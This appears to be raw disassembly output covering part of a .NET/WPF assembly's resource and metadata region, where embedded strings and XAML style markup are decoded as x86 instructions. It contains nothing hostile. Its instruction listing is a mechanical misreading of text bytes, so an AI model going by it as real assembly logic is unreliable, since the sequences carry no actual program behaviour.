110089d7:	cmp    BYTE PTR [edx],dh
110089d9:	popa   
110089da:	cmp    DWORD PTR ss:0x39623334,esi
110089e1:	xor    eax,0x65373539
110089e6:	arpl   WORD PTR ss:[ecx],si
110089e9:	cmp    BYTE PTR gs:[ebx],dh
110089ec:	popaw  
110089ee:	cmp    DWORD PTR [eax],eax
110089f0:	add    BYTE PTR [ecx-0x7efffe96],al
110089f6:	fs inc esp
110089f8:	outs   dx,DWORD PTR ds:[esi]
110089f9:	je     0x11008a61
110089fb:	jne    0x11008a70
110089fd:	arpl   WORD PTR [ecx+0x74],sp
11008a00:	outs   dx,DWORD PTR ds:[esi]
11008a01:	jb     0x11008a46
11008a03:	inc    ebp
11008a04:	cs push esp
11008a06:	gs jae 0x11008a7d
11008a09:	jae    0x11008a39
11008a0b:	push   ebp
11008a0c:	outs   dx,BYTE PTR ds:[esi]
11008a0d:	imul   esi,DWORD PTR [esp+ebp*1+0x20],0x6c627550
11008a15:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
11008a1c:	xor    BYTE PTR [edx],dh
11008a1e:	xor    al,0x30
11008a20:	xor    BYTE PTR [eax],dh
11008a22:	xor    BYTE PTR [eax],dh
11008a24:	xor    al,0x38
11008a26:	xor    BYTE PTR [eax],dh
11008a28:	xor    BYTE PTR [eax],dh
11008a2a:	xor    BYTE PTR [ecx],bh
11008a2c:	xor    al,0x30
11008a2e:	xor    BYTE PTR [eax],dh
11008a30:	xor    BYTE PTR [eax],dh
11008a32:	xor    BYTE PTR [eax],dh
11008a34:	xor    BYTE PTR ss:[edx],dh
11008a37:	xor    BYTE PTR [eax],dh
11008a39:	xor    BYTE PTR [eax],dh
11008a3b:	xor    BYTE PTR [eax],dh
11008a3d:	xor    dh,BYTE PTR [eax+esi*1]
11008a40:	xor    BYTE PTR [eax],dh
11008a42:	xor    BYTE PTR ds:0x34333532,dh
11008a48:	xor    DWORD PTR [ebx],esi
11008a4a:	xor    DWORD PTR [eax],esi
11008a4c:	xor    BYTE PTR [eax],dh
11008a4e:	xor    al,0x30
11008a50:	xor    BYTE PTR [eax],dh
11008a52:	xor    BYTE PTR [eax],dh
11008a54:	xor    DWORD PTR [eax],esi
11008a56:	xor    BYTE PTR [eax],dh
11008a58:	xor    DWORD PTR [eax],esi
11008a5a:	xor    BYTE PTR [ecx],bh
11008a5c:	aaa    
11008a5d:	popa   
11008a5e:	cmp    DWORD PTR [eax],esi
11008a60:	xor    eax,0x34616139
11008a65:	xor    eax,0x35346131
11008a6a:	aaa    
11008a6b:	xor    DWORD PTR [ecx],esi
11008a6d:	xor    eax,0x31643466
11008a72:	xor    BYTE PTR fs:[ecx+eiz*2],dh
11008a76:	bound  si,DWORD PTR fs:[esi*1+0x34336664]
11008a7f:	xor    edi,DWORD PTR [eax]
11008a81:	xor    dh,BYTE PTR [esi]
11008a83:	xor    eax,0x33636637
11008a88:	xor    dh,BYTE PTR ds:0x65336434
11008a8e:	cmp    DWORD PTR [esi+eiz*2+0x37],esp
11008a92:	aaa    
11008a93:	xor    ah,BYTE PTR fs:[ebp+0x63]
11008a97:	cmp    DWORD PTR [ebx+0x36],esp
11008a9a:	gs xor al,0x31
11008a9d:	xor    DWORD PTR [ecx],esi
11008a9f:	xor    esi,DWORD PTR [ecx]
11008aa1:	xor    al,0x34
11008aa3:	arpl   WORD PTR [eax],si
11008aa5:	xor    al,0x32
11008aa7:	arpl   WORD PTR [eax],di
11008aa9:	popa   
11008aaa:	xor    ah,BYTE PTR [ebx+0x31]
11008aad:	xor    eax,0x38323964
11008ab2:	xor    eax,0x36366238
11008ab7:	popaw  
11008ab9:	cmp    DWORD PTR [esi+0x30],esp
11008abc:	cmp    BYTE PTR [ebx+0x63],ah
11008abf:	xor    DWORD PTR [esp+eiz*2],esi
11008ac2:	arpl   WORD PTR gs:[esi+0x65],sp
11008ac6:	cmp    BYTE PTR [ebx+0x39],ah
11008ac9:	arpl   WORD PTR [ecx+0x35],sp
11008acc:	xor    DWORD PTR [eax],edi
11008ace:	gs aaa 
11008ad0:	ss aaa 
11008ad2:	arpl   WORD PTR gs:[ecx],di
11008ad5:	arpl   WORD PTR ds:0x38626663,si
11008adb:	xor    BYTE PTR [ecx],bh
11008add:	xor    esi,DWORD PTR [edi]
11008adf:	cmp    BYTE PTR fs:[ecx+esi*1+0x30],ah
11008ae4:	xor    eax,0x36326633
11008ae9:	cmp    BYTE PTR gs:[eax],dh
11008aec:	fs xor eax,0x36666237
11008af2:	bound  esp,QWORD PTR [ecx+0x65]
11008af5:	cmp    DWORD PTR [eax],edi
11008af7:	popaw  
11008af9:	xor    al,0x39
11008afb:	xor    esi,DWORD PTR [esp+eiz*2]
11008afe:	ss aaa 
11008b00:	fs xor DWORD PTR ss:[ebp+0x34],esp
11008b05:	xor    al,0x35
11008b07:	popa   
11008b08:	cmp    BYTE PTR gs:[ebx+0x61],ah
11008b0c:	xor    DWORD PTR [eax],edi
11008b0e:	bound  esi,QWORD PTR [eax]
11008b10:	xor    DWORD PTR [edx+0x31],esp
11008b13:	ss bound esp,QWORD PTR ss:[ecx+edi*1+0x63]
11008b19:	cmp    DWORD PTR [edx],esi
11008b1b:	arpl   WORD PTR [esi+0x34],sp
11008b1e:	xor    eax,0x64636164
11008b23:	xor    al,0x33
11008b25:	xor    BYTE PTR [ecx+edi*1+0x31],ah
11008b29:	cmp    DWORD PTR [ecx],edi
11008b2b:	cmp    BYTE PTR [edx+0x61],ah
11008b2e:	xor    eax,0x37343036
11008b33:	xor    DWORD PTR ds:0x30656530,esi
11008b39:	data16 xor BYTE PTR [edx],dh
11008b3c:	arpl   WORD PTR fs:[ecx+0x66],sp
11008b40:	popa   
11008b41:	bound  esi,QWORD PTR [ebx]
11008b43:	cmp    BYTE PTR [edx],dh
11008b45:	popa   
11008b46:	cmp    DWORD PTR ss:0x39623334,esi
11008b4d:	xor    eax,0x65373539
11008b52:	arpl   WORD PTR ss:[ecx],si
11008b55:	cmp    BYTE PTR gs:[ebx],dh
11008b58:	popaw  
11008b5a:	cmp    DWORD PTR [eax],eax
11008b5c:	add    BYTE PTR ds:0x10001,al
11008b62:	add    BYTE PTR [esi],bl
11008b64:	add    DWORD PTR [eax],eax
11008b66:	add    DWORD PTR [eax],eax
11008b68:	push   esp
11008b69:	add    dl,BYTE PTR [esi]
11008b6b:	push   edi
11008b6c:	jb     0x11008bcf
11008b6e:	jo     0x11008bbe
11008b70:	outs   dx,DWORD PTR ds:[esi]
11008b71:	outs   dx,BYTE PTR ds:[esi]
11008b72:	inc    ebp
11008b73:	js     0x11008bd8
11008b75:	gs jo  0x11008bec
11008b78:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
11008b7f:	ja     0x11008bf4
11008b81:	add    DWORD PTR [eax],esi
11008b83:	add    DWORD PTR [eax],eax
11008b85:	sub    eax,DWORD PTR [edi+ebp*2+0x74]
11008b89:	data16 jne 0x11008bff
11008b8c:	arpl   WORD PTR [ecx+0x74],sp
11008b8f:	outs   dx,DWORD PTR ds:[esi]
11008b90:	jb     0x11008bb2
11008b92:	popa   
11008b93:	outs   dx,BYTE PTR ds:[esi]
11008b94:	and    BYTE PTR fs:[ecx+0x6e],al
11008b98:	popa   
11008b99:	ins    BYTE PTR es:[edi],dx
11008b9a:	jns    0x11008c10
11008b9c:	imul   esp,DWORD PTR [ebx+0x73],0x6d6f4320
11008ba3:	ins    DWORD PTR es:[edi],dx
11008ba4:	jne    0x11008c14
11008ba6:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x74696445
11008bae:	imul   ebp,DWORD PTR [edi+0x6e],0x10b0000
11008bb5:	add    BYTE PTR [edx],al
11008bb7:	outs   dx,BYTE PTR gs:[esi]
11008bb9:	add    BYTE PTR [eax],al
11008bbb:	add    BYTE PTR [eax],al
11008bbd:	add    BYTE PTR [eax],al
11008bbf:	or     al,0x1
11008bc1:	add    BYTE PTR [eax],al
11008bc3:	add    BYTE PTR [eax],al
11008bc5:	add    BYTE PTR [ecx],al
11008bc7:	add    BYTE PTR [eax],al
11008bc9:	add    BYTE PTR [eax],al
11008bcb:	add    BYTE PTR [edi],cl
11008bcd:	add    DWORD PTR [eax],eax
11008bcf:	or     dh,BYTE PTR [eax+0x75]
11008bd2:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
11008bd6:	cs jae 0x11008c47
11008bd9:	imul   eax,DWORD PTR [eax],0x0
11008bdc:	or     BYTE PTR [ecx],al
11008bde:	add    BYTE PTR [eax],cl
11008be0:	add    BYTE PTR [eax],al
11008be2:	add    BYTE PTR [eax],al
11008be4:	add    BYTE PTR [eax],ah
11008be6:	add    DWORD PTR [eax],esi
11008be8:	inc    edi
11008be9:	bound  esp,QWORD PTR [edx+0x66]
11008bec:	outs   dx,WORD PTR ds:[esi]
11008bee:	addr16 jno 0x11008c59
11008bf1:	jae    0x11008c61
11008bf3:	imul   esi,DWORD PTR [ebp+0x6b],0x71706f70
11008bfa:	jo     0x11008c71
11008bfc:	js     0x11008c7c
11008bfe:	ja     0x11008c7f
11008c00:	dec    eax
11008c01:	dec    ecx
11008c02:	dec    edx
11008c03:	dec    ebx
11008c04:	dec    esp
11008c05:	dec    ebp
11008c06:	and    BYTE PTR [ecx],al
11008c08:	add    BYTE PTR [edi],dl
11008c0a:	xor    DWORD PTR [eax],esi
11008c0c:	xor    esi,DWORD PTR [edx]
11008c0e:	cmp    dh,BYTE PTR [ecx]
11008c10:	cmp    dh,BYTE PTR [eax]
11008c12:	cmp    dh,BYTE PTR [esi+ebp*1]
11008c15:	cmp    DWORD PTR [esi],ebp
11008c17:	xor    dh,BYTE PTR [eax]
11008c19:	xor    BYTE PTR [eax],dh
11008c1b:	xor    dh,BYTE PTR cs:[ecx+edi*1]
11008c1f:	xor    DWORD PTR [eax],edi
11008c21:	add    BYTE PTR [eax],al
11008c23:	add    BYTE PTR [eax],al
11008c25:	add    BYTE PTR [eax],al
11008c27:	adc    al,BYTE PTR [edi]
11008c29:	or     al,0x12
11008c2b:	popa   
11008c2c:	add    cl,BYTE PTR [esi]
11008c2e:	push   cs
11008c2f:	push   cs
11008c30:	adc    bl,BYTE PTR [ecx+0x2]
11008c33:	sbb    eax,0x1c1d080e
11008c38:	add    ecx,DWORD PTR [eax]
11008c3a:	pop    es
11008c3b:	pop    es
11008c3c:	add    eax,0x2080808
11008c41:	or     BYTE PTR [edi],al
11008c43:	pop    es
11008c44:	add    al,0x2
11008c46:	add    bl,BYTE PTR ds:0x706081c
11008c4c:	add    al,0xe
11008c4e:	push   cs
11008c4f:	add    cl,BYTE PTR [eax]
11008c51:	add    eax,DWORD PTR [edi]
11008c53:	add    DWORD PTR [edx],eax
11008c55:	add    al,0x7
11008c57:	add    DWORD PTR ds:0xc07131c,ebx
11008c5d:	sbb    eax,0xe080e0e
11008c62:	push   cs
11008c63:	adc    ah,BYTE PTR [ecx+0x2]
11008c66:	sbb    eax,0x1d031d1c
11008c6b:	push   cs
11008c6c:	or     BYTE PTR [eax],cl
11008c6e:	add    al,0x7
11008c70:	add    al,BYTE PTR [edx]
11008c72:	or     BYTE PTR [ecx],ch
11008c74:	pop    es
11008c75:	adc    al,0x1d
11008c77:	push   cs
11008c78:	adc    al,BYTE PTR [eax+0xe080e91]
11008c7e:	add    al,BYTE PTR [edx]
11008c80:	or     BYTE PTR [esi],cl
11008c82:	adc    al,BYTE PTR [eax-0x667fed6b]
11008c88:	adc    al,BYTE PTR [eax-0x627fed67]
11008c8e:	adc    al,BYTE PTR [eax+0x2031da1]
11008c94:	sbb    eax,0xa580121c
11008c99:	adc    al,BYTE PTR [eax+0x70708a9]
11008c9f:	add    al,0xe
11008ca1:	add    bl,BYTE PTR ds:0x706081c
11008ca7:	add    eax,DWORD PTR [edx]
11008ca9:	sbb    eax,0x706081c
11008cae:	add    dl,BYTE PTR [edx]
11008cb0:	cmp    BYTE PTR [ecx+0x4070a02],0x12
11008cb7:	cmp    BYTE PTR [ecx+0x2cd8012],0x8
11008cbe:	or     eax,DWORD PTR [edi]
11008cc0:	add    eax,0x8918012
11008cc5:	adc    al,BYTE PTR [eax+0x8080299]
11008ccb:	pop    es
11008ccc:	add    eax,0x808031d
11008cd1:	add    eax,0x2070605
11008cd6:	adc    al,BYTE PTR [eax+0x70a02d1]
11008cdc:	pop    es
11008cdd:	push   cs
11008cde:	push   cs
11008cdf:	push   cs
11008ce0:	sbb    eax,0x802080e
11008ce5:	or     eax,0xe0e0707
11008cea:	push   cs
11008ceb:	adc    al,BYTE PTR [eax-0x7fedfd5b]
11008cf1:	test   eax,0x3070808
11008cf6:	adc    dh,BYTE PTR [ecx+0xe]
11008cf9:	adc    al,BYTE PTR [eax+0xa0718e5]
11008cff:	push   cs
11008d00:	adc    al,BYTE PTR [eax-0x127fed17]
11008d06:	adc    al,BYTE PTR [eax-0xa7fed0f]
11008d0c:	adc    al,BYTE PTR [eax-0x27fed07]
11008d12:	push   cs
11008d13:	add    cl,BYTE PTR [eax]
11008d15:	adc    al,0x7
11008d17:	or     DWORD PTR [edx],edx
11008d19:	jno    0x11008d2d
11008d1b:	sbb    DWORD PTR [ecx],0xe118112
11008d21:	push   cs
11008d22:	adc    al,BYTE PTR [eax-0x7fedfd5b]
11008d28:	test   eax,0x2070808
11008d2d:	adc    al,BYTE PTR [ecx+0x2181121d]
11008d33:	and    eax,0x120e1307
11008d38:	sbb    BYTE PTR [edx],dl
11008d3a:	ins    DWORD PTR es:[edi],dx
11008d3b:	adc    bl,BYTE PTR [ebp+0x12]
11008d3e:	popa   
11008d3f:	adc    al,BYTE PTR [ecx+0x12711235]
11008d45:	and    cl,0x12
11008d48:	and    cl,0x2
11008d4b:	adc    bl,BYTE PTR [ecx+0xe]
11008d4e:	add    dl,BYTE PTR [edx]
11008d50:	and    cl,0x12
11008d53:	and    cl,0x8
11008d56:	add    cl,BYTE PTR [eax]
11008d58:	or     BYTE PTR [esi],cl
11008d5a:	pop    es
11008d5b:	or     DWORD PTR [esi],ecx
11008d5d:	adc    al,BYTE PTR [ecx+0x12081c69]
11008d63:	jge    0x11008d73
11008d65:	add    cl,BYTE PTR [eax]
11008d67:	or     BYTE PTR [edx],cl
11008d69:	pop    es
11008d6a:	add    al,0x12
11008d6c:	xor    DWORD PTR [ebp+0x12],0x808d580
11008d73:	add    BYTE PTR [ebx-0x31ffffc4],bh
11008d79:	retf   0xbeef
11008d7c:	add    DWORD PTR [eax],eax
11008d7e:	add    BYTE PTR [eax],al
11008d80:	xchg   ecx,eax
11008d81:	add    BYTE PTR [eax],al
11008d83:	add    BYTE PTR [ebx+edx*2+0x79],ch
11008d87:	jae    0x11008dfd
11008d89:	gs ins DWORD PTR es:[edi],dx
11008d8b:	cs push edx
11008d8d:	gs jae 0x11008dff
11008d90:	jne    0x11008e04
11008d92:	arpl   WORD PTR [ebp+0x73],sp
11008d95:	cs push edx
11008d97:	gs jae 0x11008e09
11008d9a:	jne    0x11008e0e
11008d9c:	arpl   WORD PTR [ebp+0x52],sp
11008d9f:	gs popa 
11008da1:	fs gs jb 0x11008dd1
11008da5:	and    BYTE PTR [ebp+0x73],ch
11008da8:	arpl   WORD PTR [edi+0x72],bp
11008dab:	ins    BYTE PTR es:[edi],dx
11008dac:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
11008db3:	jae    0x11008e1e
11008db5:	outs   dx,DWORD PTR ds:[esi]
11008db6:	outs   dx,BYTE PTR ds:[esi]
11008db7:	cmp    eax,0x2e302e34
11008dbc:	xor    BYTE PTR [esi],ch
11008dbe:	xor    BYTE PTR [eax+eiz*1],ch
11008dc1:	inc    ebx
11008dc2:	jne    0x11008e30
11008dc4:	je     0x11008e3b
11008dc6:	jb     0x11008e2d
11008dc8:	cmp    eax,0x7475656e
11008dcd:	jb     0x11008e30
11008dcf:	ins    BYTE PTR es:[edi],dx
11008dd0:	sub    al,0x20
11008dd2:	push   eax
11008dd3:	jne    0x11008e37
11008dd5:	ins    BYTE PTR es:[edi],dx
11008dd6:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
11008ddd:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
11008de1:	bound  esi,QWORD PTR [edi]
11008de3:	aaa    
11008de4:	popa   
11008de5:	xor    eax,0x31363563
11008dea:	cmp    DWORD PTR [ebx],esi
11008dec:	xor    al,0x65
11008dee:	xor    BYTE PTR [eax],bh
11008df0:	cmp    DWORD PTR [ebx],esp
11008df2:	push   ebx
11008df3:	jns    0x11008e68
11008df5:	je     0x11008e5c
11008df7:	ins    DWORD PTR es:[edi],dx
11008df8:	cs push edx
11008dfa:	gs jae 0x11008e6c
11008dfd:	jne    0x11008e71
11008dff:	arpl   WORD PTR [ebp+0x73],sp
11008e02:	cs push edx
11008e04:	jne    0x11008e74
11008e06:	je     0x11008e71
11008e08:	ins    DWORD PTR es:[edi],dx
11008e09:	gs push edx
11008e0b:	gs jae 0x11008e7d
11008e0e:	jne    0x11008e82
11008e10:	arpl   WORD PTR [ebp+0x53],sp
11008e13:	gs je  0x11008e18
11008e16:	add    BYTE PTR [eax],al
11008e18:	add    BYTE PTR [ecx],al
11008e1a:	add    BYTE PTR [eax],al
11008e1c:	add    BYTE PTR [eax],al
11008e1e:	add    BYTE PTR [eax],al
11008e20:	add    BYTE PTR [eax+0x41],dl
11008e23:	inc    esp
11008e24:	push   eax
11008e25:	inc    ecx
11008e26:	inc    esp
11008e27:	push   eax
11008e28:	push   0x3e
11008e2a:	adc    al,0xd8
11008e2c:	add    BYTE PTR [eax],al
11008e2e:	add    BYTE PTR [eax],al
11008e30:	out    0x0,eax
11008e32:	add    BYTE PTR [eax],al
11008e34:	arpl   WORD PTR es:[eax],ax
11008e37:	outs   dx,DWORD PTR ds:[esi]
11008e38:	add    BYTE PTR [ebp+0x0],ch
11008e3b:	ins    DWORD PTR es:[edi],dx
11008e3c:	add    BYTE PTR [ecx+0x0],ah
11008e3f:	outs   dx,BYTE PTR ds:[esi]
11008e40:	add    BYTE PTR [eax+eax*1+0x6c],ah
11008e44:	add    BYTE PTR [ecx+0x0],ch
11008e47:	outs   dx,BYTE PTR ds:[esi]
11008e48:	add    BYTE PTR [ebp+0x0],ah
11008e4b:	push   0x6c006500
11008e50:	add    BYTE PTR [eax+0x0],dh
11008e53:	add    BYTE PTR cs:[eax+0x0],bh
11008e57:	ins    DWORD PTR es:[edi],dx
11008e58:	add    BYTE PTR [eax+eax*1+0x0],ch
11008e5c:	add    BYTE PTR [eax],al
11008e5e:	add    BYTE PTR [ecx],ah
11008e60:	iret   
11008e61:	cmp    eax,DWORD PTR [eax]
11008e63:	add    BYTE PTR [ebx+edx*2],bh
11008e66:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
11008e6b:	outs   dx,BYTE PTR ds:[esi]
11008e6c:	and    BYTE PTR [eax+0x6d],bh
11008e6f:	ins    BYTE PTR es:[edi],dx
11008e70:	outs   dx,BYTE PTR ds:[esi]
11008e71:	jae    0x11008eb0
11008e73:	and    ch,BYTE PTR [eax+0x74]
11008e76:	je     0x11008ee8
11008e78:	cmp    ch,BYTE PTR [edi]
11008e7a:	das    
11008e7b:	jae    0x11008ee0
11008e7d:	push   0x73616d65
11008e82:	cs ins DWORD PTR es:[edi],dx
11008e84:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
11008e8b:	je     0x11008ebb
11008e8d:	arpl   WORD PTR [edi+0x6d],bp
11008e90:	das    
11008e91:	ja     0x11008efc
11008e93:	outs   dx,BYTE PTR ds:[esi]
11008e94:	data16 js 0x11008ec6
11008e97:	xor    dh,BYTE PTR [eax]
11008e99:	xor    BYTE PTR [esi],dh
11008e9b:	das    
11008e9c:	js     0x11008eff
11008e9e:	ins    DWORD PTR es:[edi],dx
11008e9f:	ins    BYTE PTR es:[edi],dx
11008ea0:	das    
11008ea1:	jo     0x11008f15
11008ea3:	gs jae 0x11008f0b
11008ea6:	outs   dx,BYTE PTR ds:[esi]
11008ea7:	je     0x11008f0a
11008ea9:	je     0x11008f14
11008eab:	outs   dx,DWORD PTR ds:[esi]
11008eac:	outs   dx,BYTE PTR ds:[esi]
11008ead:	and    cl,BYTE PTR ds:0x2020200a
11008eb3:	and    BYTE PTR [eax],ah
11008eb5:	and    BYTE PTR [eax],ah
11008eb7:	and    BYTE PTR [eax],ah
11008eb9:	js     0x11008f28
11008ebb:	ins    BYTE PTR es:[edi],dx
11008ebc:	outs   dx,BYTE PTR ds:[esi]
11008ebd:	jae    0x11008ef9
11008ebf:	js     0x11008efe
11008ec1:	and    ch,BYTE PTR [eax+0x74]
11008ec4:	je     0x11008f36
11008ec6:	cmp    ch,BYTE PTR [edi]
11008ec8:	das    
11008ec9:	jae    0x11008f2e
11008ecb:	push   0x73616d65
11008ed0:	cs ins DWORD PTR es:[edi],dx
11008ed2:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
11008ed9:	je     0x11008f09
11008edb:	arpl   WORD PTR [edi+0x6d],bp
11008ede:	das    
11008edf:	ja     0x11008f4a
11008ee1:	outs   dx,BYTE PTR ds:[esi]
11008ee2:	data16 js 0x11008f14
11008ee5:	xor    dh,BYTE PTR [eax]
11008ee7:	xor    BYTE PTR [esi],dh
11008ee9:	das    
11008eea:	js     0x11008f4d
11008eec:	ins    DWORD PTR es:[edi],dx
11008eed:	ins    BYTE PTR es:[edi],dx
11008eee:	and    bh,BYTE PTR [esi]
11008ef0:	or     eax,0x3c20200a
11008ef5:	push   eax
11008ef6:	popa   
11008ef7:	jb     0x11008f5a
11008ef9:	addr16 jb 0x11008f5d
11008efc:	jo     0x11008f66
11008efe:	ds or  eax,0x2020200a
11008f04:	and    BYTE PTR [ebx+0x4c],al
11008f07:	dec    ecx
11008f08:	pop    edi
11008f09:	push   ebp
11008f0a:	push   ebx
11008f0b:	inc    ecx
11008f0c:	inc    edi
11008f0d:	inc    ebp
11008f0e:	pop    edi
11008f0f:	push   ebx
11008f10:	push   ebp
11008f11:	dec    ebp
11008f12:	dec    ebp
11008f13:	inc    ecx
11008f14:	push   edx
11008f15:	pop    ecx
11008f16:	or     eax,0x3c20200a
11008f1b:	das    
11008f1c:	push   eax
11008f1d:	popa   
11008f1e:	jb     0x11008f81
11008f20:	addr16 jb 0x11008f84
11008f23:	jo     0x11008f8d
11008f25:	ds or  eax,0x3c20200a
11008f2b:	push   esp
11008f2c:	popa   
11008f2d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x3e]
11008f31:	or     eax,0x2020200a
11008f36:	and    BYTE PTR [esp+edx*2],bh
11008f39:	popa   
11008f3a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x2e]
11008f3e:	push   edx
11008f3f:	gs jae 0x11008fb1
11008f42:	jne    0x11008fb6
11008f44:	arpl   WORD PTR [ebp+0x73],sp
11008f47:	ds or  eax,0x2020200a
11008f4d:	and    BYTE PTR [eax],ah
11008f4f:	and    BYTE PTR [ecx+eiz*1],bh
11008f52:	sub    eax,0x7453202d
11008f57:	jns    0x11008fc5
11008f59:	and    BYTE PTR gs:[esi+0x6f],ah
11008f5d:	jb     0x11008f7f
11008f5f:	push   0x65646165
11008f64:	jb     0x11008f95
11008f66:	outs   dx,WORD PTR ds:[esi]
11008f68:	outs   dx,DWORD PTR ds:[esi]
11008f69:	je     0x11008fd0
11008f6b:	jb     0x11008f8d
11008f6d:	jb     0x11008fde
11008f6f:	ja     0x11008fe4
11008f71:	and    BYTE PTR cs:0xa0d3e2d,ch
11008f78:	and    BYTE PTR [eax],ah
11008f7a:	and    BYTE PTR [eax],ah
11008f7c:	and    BYTE PTR [eax],ah
11008f7e:	cmp    al,0x53
11008f80:	je     0x11008ffb
11008f82:	ins    BYTE PTR es:[edi],dx
11008f83:	and    BYTE PTR gs:[eax+0x3a],bh
11008f87:	dec    ebx
11008f88:	gs jns 0x11008fc8
11008f8b:	and    ch,BYTE PTR [eax+0x65]
11008f8e:	popa   
11008f8f:	fs gs jb 0x11008fd9
11008f93:	outs   dx,DWORD PTR ds:[esi]
11008f94:	outs   dx,DWORD PTR ds:[esi]
11008f95:	je     0x11008ffc
11008f97:	jb     0x11008feb
11008f99:	outs   dx,DWORD PTR ds:[esi]
11008f9a:	ja     0x11008fef
11008f9c:	je     0x11009017
11008f9e:	ins    BYTE PTR es:[edi],dx
11008f9f:	and    ah,BYTE PTR gs:[eax]
11008fa2:	push   esp
11008fa3:	popa   
11008fa4:	jb     0x1100900d
11008fa6:	gs je  0x11008ffd
11008fa9:	jns    0x1100901b
11008fab:	gs cmp eax,0x3a787b22
11008fb1:	push   esp
11008fb2:	jns    0x11009024
11008fb4:	and    BYTE PTR gs:[ecx+eiz*2+0x62],dl
11008fb9:	ins    BYTE PTR es:[edi],dx
11008fba:	gs push edx
11008fbc:	outs   dx,DWORD PTR ds:[esi]
11008fbd:	ja     0x11009006
11008fbf:	jb     0x11009030
11008fc1:	jne    0x11009033
11008fc3:	jge    0x11008fe7
11008fc5:	ds or  eax,0x2020200a
11008fcb:	and    BYTE PTR [eax],ah
11008fcd:	and    BYTE PTR [eax],ah
11008fcf:	and    BYTE PTR [ebx+edx*2],bh
11008fd2:	gs je  0x11009049
11008fd5:	gs jb  0x11008ff8
11008fd8:	push   eax
11008fd9:	jb     0x1100904a
11008fdb:	jo     0x11009042
11008fdd:	jb     0x11009053
11008fdf:	jns    0x1100901e
11008fe1:	and    al,BYTE PTR [esi+0x6f]
11008fe4:	outs   dx,BYTE PTR ds:[esi]
11008fe5:	je     0x1100903e
11008fe7:	imul   esp,DWORD PTR gs:[edi+0x68],0x56202274
11008fef:	popa   
11008ff0:	ins    BYTE PTR es:[edi],dx
11008ff1:	jne    0x11009058
11008ff3:	cmp    eax,0x6d654422
11008ff8:	imul   eax,DWORD PTR [edx+0x6f],0x2f22646c
11008fff:	ds or  eax,0x2020200a
11009005:	and    BYTE PTR [eax],ah
11009007:	and    BYTE PTR [eax],ah
11009009:	and    BYTE PTR [ebx+edx*2],bh
1100900c:	gs je  0x11009083
1100900f:	gs jb  0x11009032
11009012:	push   eax
11009013:	jb     0x11009084
11009015:	jo     0x1100907c
11009017:	jb     0x1100908d
11009019:	jns    0x11009058
1100901b:	and    al,BYTE PTR [esi+0x6f]
1100901e:	outs   dx,BYTE PTR ds:[esi]
1100901f:	je     0x11009074
11009021:	imul   edi,DWORD PTR [edx+0x65],0x61562022
11009028:	ins    BYTE PTR es:[edi],dx
11009029:	jne    0x11009090
1100902b:	cmp    eax,0x22363122
11009030:	das    
11009031:	ds or  eax,0x2020200a
11009037:	and    BYTE PTR [eax],ah
11009039:	and    BYTE PTR [eax],ah
1100903b:	and    BYTE PTR [ebx+edx*2],bh
1100903e:	gs je  0x110090b5
11009041:	gs jb  0x11009064
11009044:	push   eax
11009045:	jb     0x110090b6
11009047:	jo     0x110090ae
11009049:	jb     0x110090bf
1100904b:	jns    0x1100908a
1100904d:	and    al,BYTE PTR [edx+0x61]
11009050:	arpl   WORD PTR [ebx+0x67],bp
11009053:	jb     0x110090c4
11009055:	jne    0x110090c5
11009057:	and    ah,BYTE PTR fs:[eax]
1100905a:	push   esi
1100905b:	popa   
1100905c:	ins    BYTE PTR es:[edi],dx
1100905d:	jne    0x110090c4
1100905f:	cmp    eax,0x67694c22
11009064:	push   0x61724774
11009069:	jns    0x1100908d
1100906b:	das    
1100906c:	and    BYTE PTR ds:[eax],ah
1100906f:	and    BYTE PTR [eax],ah
11009071:	and    BYTE PTR [eax],ah
11009073:	and    BYTE PTR [eax],ah
11009075:	or     eax,0x2020200a
1100907a:	and    BYTE PTR [eax],ah
1100907c:	and    BYTE PTR [edi+ebp*1],bh
1100907f:	push   ebx
11009080:	je     0x110090fb
11009082:	ins    BYTE PTR es:[edi],dx
11009083:	gs ds or eax,0x200a0d0a
1100908a:	and    BYTE PTR [eax],ah
1100908c:	and    BYTE PTR [eax],ah
1100908e:	and    BYTE PTR [ecx+eiz*1],bh
11009091:	sub    eax,0x7453202d
11009096:	jns    0x11009104
11009098:	and    BYTE PTR gs:[esi+0x6f],ah
1100909c:	jb     0x110090be
1100909e:	fs popa 
110090a0:	je     0x11009103
110090a2:	and    BYTE PTR [edx+0x6f],dh
110090a5:	ja     0x1100911a
110090a7:	and    BYTE PTR cs:0xa0d3e2d,ch
110090ae:	and    BYTE PTR [eax],ah
110090b0:	and    BYTE PTR [eax],ah
110090b2:	and    BYTE PTR [eax],ah
110090b4:	cmp    al,0x53
110090b6:	je     0x11009131
110090b8:	ins    BYTE PTR es:[edi],dx
110090b9:	and    BYTE PTR gs:[eax+0x3a],bh
110090bd:	dec    ebx
110090be:	gs jns 0x110090fe
110090c1:	and    ah,BYTE PTR [ecx+eiz*2+0x74]
110090c5:	popa   
110090c6:	push   edx
110090c7:	outs   dx,DWORD PTR ds:[esi]
110090c8:	ja     0x1100911d
110090ca:	je     0x11009145
110090cc:	ins    BYTE PTR es:[edi],dx
110090cd:	and    ah,BYTE PTR gs:[eax]
110090d0:	push   esp
110090d1:	popa   
110090d2:	jb     0x1100913b
110090d4:	gs je  0x1100912b
110090d7:	jns    0x11009149
110090d9:	gs cmp eax,0x3a787b22
110090df:	push   esp
110090e0:	jns    0x11009152
110090e2:	and    BYTE PTR gs:[ecx+eiz*2+0x62],dl
110090e7:	ins    BYTE PTR es:[edi],dx
110090e8:	gs push edx
110090ea:	outs   dx,DWORD PTR ds:[esi]
110090eb:	ja     0x11009134
110090ed:	jb     0x1100915e
110090ef:	jne    0x11009161
110090f1:	jge    0x11009115
110090f3:	ds or  eax,0x2020200a
110090f9:	and    BYTE PTR [eax],ah
110090fb:	and    BYTE PTR [eax],ah
110090fd:	and    BYTE PTR [ebx+edx*2],bh
11009100:	gs je  0x11009177
11009103:	gs jb  0x11009126
